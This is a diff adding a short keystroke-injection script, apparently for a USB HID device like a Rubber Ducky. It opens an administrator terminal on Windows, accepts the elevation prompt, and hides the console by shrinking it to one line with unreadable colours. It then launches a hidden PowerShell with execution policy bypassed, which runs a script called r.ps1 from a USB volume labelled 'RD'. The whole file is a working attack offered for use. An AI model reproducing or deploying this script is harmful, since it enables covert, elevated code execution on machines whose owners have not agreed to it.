@@ -1,0 +1,18 @@
+REM --> Launch a terminal (cmd or powershell) with admin privs
+DELAY 1000
+GUI x
+DELAY 1000
+STRING a
+DELAY 1000
+ALT y
+DELAY 1500
+
+REM --> Launch command prompt, obfuscating screen colors and size
+STRING cmd /K "color fe && mode con cols=18 lines=1"
+ENTER
+DELAY 500
+
+REM --> launch the payload
+REM STRING powershell -nop -noni -w h -ep bypass "$p=gwmi Win32_Volume|?{$_.Label -eq 'RD'}|select name;cd $p.name;.\r.ps1"
+STRING powershell -nop -noni -w h -ep bypass ".(((Get-Volume -FileSy 'RD').DriveLetter)+':\r.ps1')"
+ENTER
